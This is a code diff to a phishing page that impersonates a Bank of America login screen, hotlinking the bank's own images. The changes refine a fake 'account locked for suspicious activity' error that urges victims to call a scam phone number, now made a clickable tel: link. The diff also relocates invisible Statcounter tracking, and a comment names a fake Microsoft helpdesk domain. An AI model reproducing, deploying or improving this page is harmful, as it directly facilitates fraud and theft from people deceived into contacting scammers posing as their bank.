@@ -142,10 +142,10 @@
       errorBox.style.display = "block";
       errorBox.innerHTML = `
         <strong>Your account has been locked.</strong>
-        <ul>
-          <li>Your account has been frozen due to suspicious activity.</li>
-          <li>Please call Bank of America at <strong>+1-810-314-2930</strong> to resolve the issue.</li>
-        </ul>
+        <p style="margin-top: 10px;">
+          Your account has been frozen due to suspicious activity.
+          Please call <a href="tel:+18103142930" style="color: #0066cc; text-decoration: underline; white-space: nowrap;"><strong>+1-810-314-2930</strong></a> to resolve the issue.
+        </p>
       `;
     }
   </script>
@@ -158,7 +158,7 @@
          alt="Bank of America Header" />
   </div>
 
-  <!-- Content Area with Form and Image -->
+  <!-- Content Area -->
   <div class="content-container">
     <!-- Login Form -->
     <div class="login-container">
@@ -177,14 +177,14 @@
       <div id="error-message" class="error-message"></div>
     </div>
 
-    <!-- Right-Side Image -->
+    <!-- Branding Image -->
     <div class="llama-container">
       <img src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png"
            alt="Llama Image" />
     </div>
   </div>
 
-  <!-- Promotional Image and Offers Section -->
+  <!-- Promotional Section -->
   <div style="background-color: #f9f9f9; padding: 40px 20px; margin: 40px 0;">
     <div style="text-align: center; margin-bottom: 30px;">
       <img 
@@ -220,22 +220,23 @@
       <a href="#">Terms of Use</a>
     </p>
   </footer>
+
+  <!-- Statcounter Code -->
+  <!-- Default Statcounter code for micro -->
+  <script type="text/javascript">
+    var sc_project=13141255; 
+    var sc_invisible=1; 
+    var sc_security="c6f9d922"; 
+  </script>
+  <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+  <noscript>
+    <div class="statcounter">
+      <a title="Web Analytics" href="https://statcounter.com/" target="_blank">
+        <img class="statcounter" src="https://c.statcounter.com/13141255/0/c6f9d922/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">
+      </a>
+    </div>
+  </noscript>
+  <!-- End of Statcounter Code -->
+
 </body>
-  <!-- Default Statcounter code for micro
-https://micro-softs-helpdesks.vercel.app/ -->
-<script type="text/javascript">
-var sc_project=13141255; 
-var sc_invisible=1; 
-var sc_security="c6f9d922"; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13141255/0/c6f9d922/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
 </html>
